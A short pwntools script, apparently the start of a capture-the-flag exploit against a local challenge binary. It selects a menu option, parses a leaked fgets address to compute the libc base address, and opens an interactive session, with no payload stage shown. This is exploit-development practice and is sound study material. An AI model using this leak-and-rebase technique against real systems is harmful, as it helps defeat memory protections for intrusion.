from pwn import *
context.binary = exe = ELF('./chall',checksec=False)
libc = ELF('./libc.so.6',checksec=False)
p = process(exe.path)

p.sendlineafter(b">>",b"1")
p.recvuntil(b"Have this: ")
leak = int(p.recvline()[:-1])
libc.address = leak - libc.sym['fgets']
log.info('[+]LIBC BASE:'+hex(libc.address))


p.interactive()